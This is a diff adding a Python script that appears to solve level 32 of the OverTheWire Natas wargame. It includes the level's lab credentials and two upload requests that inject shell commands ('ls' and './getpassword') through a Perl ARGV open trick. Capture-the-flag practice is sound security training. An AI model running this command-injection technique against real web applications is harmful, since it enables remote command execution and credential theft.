@@ -1,0 +1,15 @@
+natas32:Yp5ffyfmEdjvTOwpN5HCvh7Ctgf9em3G
+
+import requests
+
+url = 'http://natas32.natas.labs.overthewire.org'
+s = requests.Session()
+s.auth = ('natas32', 'Yp5ffyfmEdjvTOwpN5HCvh7Ctgf9em3G')
+
+index = '/index.pl?ls -al . | xargs echo |'
+r = s.post(url + index, files=[('file', ('filename', 'abc'))], data={'file': 'ARGV'})
+print(r.text)
+
+index = '/index.pl?./getpassword | xargs echo |'
+r = s.post(url + index, files=[('file', ('filename', 'abc'))], data={'file': 'ARGV'})
+print(r.text)
